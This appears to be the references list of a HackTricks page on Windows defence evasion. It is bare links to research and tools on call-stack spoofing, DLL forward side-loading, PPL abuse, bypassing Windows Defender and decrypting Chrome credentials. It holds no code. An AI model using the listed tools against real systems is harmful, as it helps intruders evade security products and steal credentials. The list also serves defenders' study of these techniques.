- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
